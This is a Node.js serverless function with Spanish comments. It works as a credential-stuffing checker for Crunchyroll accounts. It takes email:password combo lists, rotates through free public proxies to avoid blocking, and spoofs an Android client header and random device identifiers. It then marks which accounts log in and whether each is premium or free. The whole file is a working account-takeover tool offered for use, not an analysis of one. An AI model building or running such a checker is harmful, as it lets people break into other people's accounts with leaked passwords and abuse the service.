const axios = require('axios');
const crypto = require('crypto');
const { HttpsProxyAgent } = require('https-proxy-agent');

exports.handler = async (event) => {
    const headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Access-Control-Allow-Methods': 'POST, OPTIONS'
    };

    if (event.httpMethod === 'OPTIONS') return { statusCode: 200, headers, body: '' };
    if (event.httpMethod !== 'POST') return { statusCode: 405, headers, body: 'Method Not Allowed' };

    try {
        const { combos } = JSON.parse(event.body);
        const results = [];

        for (const combo of combos) {
            if (!combo.includes(':')) continue;
            const [email, password] = combo.split(':');

            const randomDeviceId = crypto.randomBytes(16).toString('hex');
            const randomDeviceName = 'SM-G' + Math.floor(Math.random() * 9000 + 1000);

            // === BUSCAMOS PROXIES FRESCOS EN TIEMPO REAL ===
            let proxyUrl = null;
            try {
                // Le pedimos a ProxyScrape 20 proxies HTTP vivos
                const proxyApi = await axios.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=yes&anonymity=all', { timeout: 5000 });
                const proxyList = proxyApi.data.split('\r\n').filter(p => p.trim() !== '');
                
                if (proxyList.length > 0) {
                    // Elegimos uno al azar de la lista que acabamos de bajar
                    const randomProxy = proxyList[Math.floor(Math.random() * proxyList.length)];
                    proxyUrl = 'http://' + randomProxy;
                }
            } catch (e) {
                console.log("Error bajando proxies frescos, intentando sin proxy...");
            }

            // Si conseguimos proxy, lo usamos. Si no, va directo (y probablemente falle).
            const agent = proxyUrl ? new HttpsProxyAgent(proxyUrl) : undefined;

            try {
                const res = await axios.post('https://beta-api.crunchyroll.com/auth/v1/token', 
                    new URLSearchParams({
                        grant_type: 'password',
                        username: email,
                        password: password,
                        scope: 'offline_access',
                        device_id: randomDeviceId,
                        device_name: randomDeviceName,
                        device_type: 'samsung ' + randomDeviceName
                    }).toString(),
                    {
                        headers: {
                            'Authorization': 'Basic d2piMV90YThta3Y3X2t4aHF6djc6MnlSWlg0Y0psX28yMzRqa2FNaXRTbXNLUVlGaUpQXzU=',
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'User-Agent': 'Crunchyroll/3.59.0 Android/14 okhttp/4.12.0'
                        },
                        httpsAgent: agent,
                        timeout: 15000 
                    }
                );

                if (res.status === 200 && res.data.access_token) {
                    const isPremium = res.data.scope.includes('mp offline_access');
                    results.push({ email, valid: true, plan: isPremium ? 'PREMIUM' : 'FREE' });
                } else {
                    results.push({ email, valid: false, reason: 'Credenciales inválidas' });
                }
            } catch (err) {
                results.push({ email, valid: false, reason: 'Error: ' + (err.response ? err.response.status : err.message) });
            }
        }
        return { statusCode: 200, headers, body: JSON.stringify({ results }) };
    } catch (e) {
        return { statusCode: 500, headers, body: JSON.stringify({ error: e.message }) };
    }
};
